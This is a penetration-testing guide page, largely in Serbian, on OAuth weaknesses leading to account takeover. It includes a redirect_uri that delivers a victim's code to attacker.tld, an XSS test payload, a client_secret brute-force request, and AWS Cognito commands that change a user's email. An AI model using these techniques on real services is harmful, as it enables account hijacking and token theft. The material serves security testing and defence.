# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije <a href="#d4a8" id="d4a8"></a>

OAuth nudi različite verzije, a osnovne informacije mogu se naći na [OAuth 2.0 documentation](https://oauth.net/2/). Ova razmatranja se pretežno fokusiraju na široko korišćeni [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), koji obezbeđuje **authorization framework that enables an application to access or perform actions on a user's account in another application** (authorization server).

Zamislite hipotetički sajt _**https://example.com**_, kreiran da **prikaže sve vaše objave na društvenim mrežama**, uključujući privatne. Za to se koristi OAuth 2.0. _https://example.com_ će tražiti vašu dozvolu da **access your social media posts**. Kao posledica, na _https://socialmedia.com_ će se pojaviti consent screen koji navodi **permissions being requested and the developer making the request**. Nakon vaše autorizacije, _https://example.com_ dobija mogućnost da **access your posts on your behalf**.

Važno je razumeti sledeće komponente unutar OAuth 2.0 okvira:

- **resource owner**: You, as the **user/entity**, autorizujete pristup svom resursu, na primer objavama na nalogu društvene mreže.
- **resource server**: Server koji **manages authenticated requests** nakon što aplikacija dobije `access token` u ime `resource owner`, npr. **https://socialmedia.com**.
- **client application**: Aplikacija koja **seeking authorization** od `resource owner`, kao što je **https://example.com**.
- **authorization server**: Server koji **issues `access tokens`** `client application` nakon uspešne autentifikacije `resource owner` i dobijene autorizacije, npr. **https://socialmedia.com**.
- **client_id**: Javni, jedinstveni identifikator aplikacije.
- **client_secret:** Tajni ključ, poznat samo aplikaciji i authorization server-u, koji se koristi za generisanje `access_tokens`.
- **response_type**: Vrednost koja specificira **the type of token requested**, npr. `code`.
- **scope**: Nivo pristupa koji `client application` traži od `resource owner`.
- **redirect_uri**: URL na koji je korisnik preusmeren nakon autorizacije. Obično mora da se poklapa sa unapred registrovanim redirect URL-om.
- **state**: Parametar za **održavanje podataka tokom preusmeravanja korisnika na authorization server i nazad**. Njegova jedinstvenost je kritična jer služi kao **CSRF protection mechanism**.
- **grant_type**: Parametar koji označava **grant type i tip tokena koji će biti vraćen**.
- **code**: Authorization code od authorization server-a, koji klijent koristi zajedno sa `client_id` i `client_secret` da bi pribavio `access_token`.
- **access_token**: Token koji `client application` koristi za API zahteve u ime `resource owner`.
- **refresh_token**: Omogućava aplikaciji da **obnovi `access_token` bez ponovnog traženja pristanka od korisnika**.

### Tok

Stvarni OAuth tok ide ovako:

1. Posetite [https://example.com](https://example.com) i izaberete dugme „Integracija sa društvenim mrežama“.
2. Sajt potom šalje zahtev ka [https://socialmedia.com](https://socialmedia.com) tražeći vašu autorizaciju da aplikacija sa https://example.com pristupi vašim objavama. Zahtev je strukturiran kao:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Zatim vam se prikazuje stranica za saglasnost.
4. Nakon vašeg odobrenja, Social Media šalje odgovor na `redirect_uri` sa parametrima `code` i `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com koristi ovaj `code`, zajedno sa svojim `client_id` i `client_secret`, da izvrši zahtev sa serverske strane i pribavi `access_token` u vaše ime, omogućavajući pristup dozvolama na koje ste pristali:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Na kraju, proces se završava kada https://example.com upotrebi vaš `access_token` da izvrši API poziv ka društvenoj mreži radi pristupa

## Ranljivosti <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Prema [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), server za autorizaciju treba da preusmeri pregledač isključivo na **pre-registered, exact redirect URIs**. Bilo koja slabost ovde omogućava napadaču da navede žrtvu kroz zlonamerni authorization URL tako da IdP isporuči žrtvin `code` (i `state`) direktno na endpoint napadača, koji ga zatim može unovčiti i prikupiti tokene.

Tipičan tok napada:

1. Kreirajte `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` i pošaljite ga žrtvi.
2. Žrtva se autentifikuje i odobri scopes.
3. IdP preusmeri na `attacker.tld/callback?code=<victim-code>&state=...` gde napadač zabeleži zahtev i odmah iskoristi `code`.

Uobičajeni bagovi u validaciji koje treba ispitati:

- **Nema validacije** – bilo koji apsolutni URL se prihvata, što rezultuje trenutnom krađom `code`-a.
- **Slabe substring/regex provere na hostu** – zaobiđite provere pomoću lookalike domena kao što su `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ili `match.com@evil.com`.
- **IDN homograph mismatches** – validacija se vrši na punycode formi (`xn--`), ali pregledač preusmerava na Unicode domen pod kontrolom napadača.
- **Arbitrary paths on an allowed host** – upućivanje `redirect_uri` na `/openredirect?next=https://attacker.tld` ili bilo koji XSS/user-content endpoint leaks the `code` bilo kroz chained redirects, Referer zaglavlja, ili injektovani JavaScript.
- **Directory constraints without normalization** – obrasci poput `/oauth/*` mogu se zaobići sa `/oauth/../anything`.
- **Wildcard subdomains** – prihvatanje `*.example.com` znači da bilo koji takeover (dangling DNS, S3 bucket, itd.) odmah daje važeći callback.
- **Non-HTTPS callbacks** – dopuštanje `http://` URI-ja omogućava mrežnim napadačima (Wi‑Fi, korporativni proxy) priliku da presretnu `code` u tranzitu.

Takođe proverite pomoćne redirect-style parametre (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, itd.) i OpenID discovery dokument (`/.well-known/openid-configuration`) za dodatne endpoint-e koji mogu naslediti iste bugove u validaciji.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Kao što je pomenuto u ovom bug bounty izveštaju [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), moguće je da se redirect **URL ispoljava u odgovoru** servera nakon što se korisnik autentifikuje, čineći ga **ranjivim na XSS**. Mogući payload za testiranje:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Neispravno rukovanje state parameterom <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

The replay pattern is always the same:

1. The attacker authenticates against the IdP with their account and intercepts the last redirect containing `code` (and any `state`).
2. They drop that request, keep the URL, and later abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.
3. If the client does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the victim’s app account.

A practical checklist for `state` handling during tests:

- **Missing `state` entirely** – if the parameter never appears, the whole login is CSRFable.
- **`state` not required** – remove it from the initial request; if the IdP still issues codes that the client accepts, the defense is opt-in.
- **Returned `state` not validated** – tamper with the value in the response (Burp, MITM proxy). Accepting mismatched values means the stored token is never compared.
- **Predictable or purely data-driven `state`** – many apps stuff redirect paths or JSON blobs into `state` without mixing in randomness, letting attackers guess valid values and replay flows. Always prepend/append strong entropy before encoding data.
- **`state` fixation** – if the app lets users supply the `state` value (e.g., via crafted authorization URLs) and reuses it throughout the flow, an attacker can lock in a known value and reuse it across victims.

PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Bez verifikacije mejla pri kreiranju naloga**: Napadači mogu preventivno kreirati nalog koristeći žrtvin email. Ako žrtva kasnije koristi third-party servis za prijavu, aplikacija može nenamerno povezati taj third-party nalog sa napadačevim prethodno kreiranim nalogom, što vodi do neovlašćenog pristupa.
2. **Iskorišćavanje popustljive OAuth verifikacije mejla**: Napadači mogu iskoristiti OAuth servise koji ne verifikuju mejlove tako što se registruju kod njih i zatim promene email naloga na žrtvin. Ova metoda slično dovodi do rizika neovlašćenog pristupa nalogu, slično prvom scenariju ali kroz drugačiji vektor napada.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Za detaljnije informacije o tome kako zloupotrebiti AWS Cognito pogledajte [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Kao što je [**pomenuto u ovom writeupu**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth tokovi koji očekuju da prime **token** (a ne code) mogu biti ranjivi ako ne provere da li token pripada aplikaciji.

To je zato što napadač može napraviti sopstvenu aplikaciju koja podržava OAuth i login preko Facebook-a (na primer). Zatim, kada žrtva izvrši login preko Facebook-a u aplikaciji napadača, napadač može dobiti **OAuth token korisnika dodeljen njegovoj aplikaciji** i iskoristiti ga da se prijavi u žrtvinoj OAuth aplikaciji koristeći token korisnika žrtve.

> [!CAUTION]
> Dakle, ako napadač uspe da natera korisnika da pristupi njegovoj OAuth aplikaciji, moći će da preuzme nalog žrtve u aplikacijama koje očekuju token i ne proveravaju da li je token dodeljen njihovom app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Prema [**ovom writeupu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), bilo je moguće navesti žrtvu da otvori stranicu sa **returnUrl** koji pokazuje na host napadača. Ova informacija bi se **sačuvala u cookie-u (RU)** i u **kasnijem koraku** bi **prompt** pitao **korisnika** da li želi da dodeli pristup tom hostu napadača.

Da bi se zaobišao ovaj prompt, bilo je moguće otvoriti tab koji inicira **Oauth flow** koji bi postavio ovaj RU cookie koristeći **returnUrl**, zatvoriti taj tab pre nego što se prompt prikaže, i otvoriti novi tab bez te vrednosti. Tada, **prompt neće obavestiti o hostu napadača**, ali će cookie biti postavljen na njega, pa će **token biti poslat napadačevom hostu** u redirekciji.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Kao što je objašnjeno u [**ovom videu**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), neke OAuth implementacije dozvoljavaju da se GET parametar `prompt` postavi na None (**`&prompt=none`**) da bi se **sprečilo da korisnici budu pitani za potvrdu** dodeljenog pristupa u web promptu ako su već prijavljeni na platformu.

### response_mode

Kao što je [**objašnjeno u ovom videu**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), moguće je navesti parametar **`response_mode`** da se odredi gde želite da code bude dostavljen u finalnom URL-u:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs su idealne mete za Clickjacking: ako se mogu ugraditi u iframe, napadač može prekriti stranici sopstvenu grafiku, sakriti prave dugmiće i prevariti korisnike da odobre opasne scope-ove ili povežu naloge. Napravite PoC-e koji:

1. Učita IdP authorization URL unutar `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Koristi absolute positioning/opacity trikove da poravna lažna dugmad sa skrivenim **Allow**/**Approve** kontrolama.
3. Opcionalno unapred popuni parametre (scopes, redirect URI) tako da ukradeno odobrenje odmah ide u korist napadača.

Tokom testiranja proverite da li IdP stranice emituju `X-Frame-Options: DENY/SAMEORIGIN` ili restriktivnu `Content-Security-Policy: frame-ancestors 'none'`. Ako nijedna od ovih nije prisutna, demonstrirajte rizik alatima poput [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) i snimite koliko je lako žrtvu navesti da autorizuje napadačevu aplikaciju. Za dodatne ideje za payload pogledajte [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Prema [**ovom blog postu**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), ovo je OAuth flow koji omogućava login u OAuth koristeći **username** i **password**. Ako tokom ovog jednostavnog toka bude vraćen **token** koji ima pristup svim akcijama koje korisnik može izvršiti, moguće je zaobići 2FA koristeći taj token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ovaj [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) opisuje kako je moguće zloupotrebiti **open redirect** na vrednost iz **referrer** da se izvrši OAuth -> ATO napad. Napad je bio:

1. Žrtva pristupi napadačevoj web stranici.
2. Žrtva otvori maliciozni link i opener pokrene Google OAuth flow sa `response_type=id_token,code&prompt=none` kao dodatnim parametrima koristeći za **referrer napadačev sajt**.
3. U opener-u, nakon što provider autorizuje žrtvu, šalje je nazad na vrednost `redirect_uri` parametra (žrtvina web) sa 30X kodom koji i dalje zadržava napadačevu web lokaciju u refereru.
4. Žrtvina **website trigger the open redirect based on the referrer** preusmerava korisnika na napadačev sajt, pošto je **`respose_type`** bio **`id_token,code`**, code će biti poslat napadaču u **fragmentu** URL-a, što mu omogućava da preuzme nalog korisnika preko Google-a na žrtvinoj strani.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration u OAuth služi kao manje očigledan ali kritičan vektor za bezbednosne ranjivosti, posebno za **Server-Side Request Forgery (SSRF)** napade. Ovaj endpoint omogućava OAuth serverima da prime informacije o client aplikacijama, uključujući osetljive URL-ove koji se mogu iskoristiti.

Key Points:

- **Dynamic Client Registration** se često mapira na `/register` i prihvata detalje kao što su `client_name`, `client_secret`, `redirect_uris`, i URL-ove za logo ili JSON Web Key Sets (JWKs) putem POST zahteva.
- Ova funkcionalnost sledi specifikacije iz **RFC7591** i **OpenID Connect Registration 1.0**, koje uključuju parametre potencijalno podložne SSRF-u.
- Proces registracije može nenamerno izložiti servere SSRF-u na nekoliko načina:
- **`logo_uri`**: URL za logo client aplikacije koji server možda preuzme, pokrećući SSRF ili vodeći do XSS ako se URL neobrađuje ispravno.
- **`jwks_uri`**: URL za JWK dokument klijenta, koji ako je maliciozno konstruisan, može naterati server da izvrši outbound zahteve ka serveru pod kontrolom napadača.
- **`sector_identifier_uri`**: Referiše JSON niz `redirect_uris`, koji server može fetch-ovati, stvarajući SSRF priliku.
- **`request_uris`**: Lista dozvoljenih request URI-ja za klijenta, koja se može iskoristiti ako server preuzme te URI-je na početku autorizacionog procesa.

Exploitation Strategy:

- SSRF se može pokrenuti registracijom novog clienta sa malicioznim URL-ovima u parametrima poput `logo_uri`, `jwks_uri` ili `sector_identifier_uri`.
- Iako direktna eksploatacija putem `request_uris` može biti ublažena kontrolama bele liste, dostavljanje prethodno registrovanog, napadačem kontrolisanog `request_uri` može omogućiti SSRF tokom autorizacione faze.

## OAuth providers Race Conditions

Ako platforma koju testirate funkcioniše kao OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

U OAuth-u, polje sub jedinstveno identifikuje korisnika, ali njegov format varira između Authorization Server-a. Da bi standardizovali identifikaciju korisnika, neki klijenti koriste emailove ili korisnička imena. Međutim, to nosi rizik zato što:

- Neki Authorization Server-i ne garantuju da ove osobine (kao email) ostaju immutable.
- U nekim implementacijama — kao što je **"Login with Microsoft"** — klijent se oslanja na polje email, koje je **kontrolisano od strane korisnika u Entra ID** i nije verifikovano.
- Napadač to može iskoristiti kreiranjem sopstvene Azure AD organizacije (npr. doyensectestorg) i korišćenjem iste za Microsoft login.
- Iako je Object ID (smešten u sub) immutable i bezbedan, oslanjanje na promenljivo polje email može omogućiti preuzimanje naloga (npr. hijack naloga poput victim@gmail.com).

## Client Confusion Attack

U **Client Confusion Attack**, aplikacija koja koristi OAuth Implicit Flow ne uspeva da verifikuje da je finalni access token specifično generisan za njen Client ID. Napadač postavi javni web sajt koji koristi Google’s OAuth Implicit Flow, prevare hiljade korisnika da se uloguju i tako sakuplja access tokene namenjene napadačevoj strani. Ako ti korisnici takođe imaju naloge na drugom ranjivom sajtu koji ne proverava Client ID tokena, napadač može ponovo iskoristiti sakupljene tokene da se predstavlja kao žrtve i preuzme njihove naloge.

## Scope Upgrade Attack

Tip Authorization Code Grant uključuje sigurnu server-to-server komunikaciju za prenos korisničkih podataka. Međutim, ako **Authorization Server** implicitno veruje scope parametru u Access Token Request-u (parametar koji nije definisan u RFC-u), maliciozna aplikacija može nadograditi privilegije authorization code-a tražeći veći scope. Nakon što se generiše **Access Token**, **Resource Server** mora da ga verifikuje: za JWT tokene to podrazumeva proveru JWT potpisa i izdvajanje podataka kao što su client_id i scope, dok za random string tokene server mora da query-uje Authorization Server da bi dobio detalje o tokenu.

## Redirect Scheme Hijacking

U mobilnim OAuth implementacijama, aplikacije koriste **custom URI schemes** da prime redirekcije sa Authorization Codes. Međutim, pošto više aplikacija može registrovati isti scheme na uređaju, pretpostavka da samo legitimni client kontroliše redirect URI je narušena. Na Android-u, na primer, Intent URI poput `com.example.app://` oauth biva uhvaćen na osnovu sheme i opcionih filtera definisanih u intent-filter aplikacije. Pošto Android-ova intent rezolucija može biti široka — naročito ako je specificirana samo shema — napadač može registrovati malicioznu aplikaciju sa pažljivo konstruisanim intent filterom da hijack-uje authorization code. Ovo može omogućiti preuzimanje naloga bilo kroz interakciju korisnika (kada je više aplikacija podobno da obradi intent) ili putem bypass tehnika koje iskorišćavaju previše široke filtere, kao što je detaljno opisano u Ostorlab-ovom assessment flowchart-u.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)

{{#include ../banners/hacktricks-training.md}}
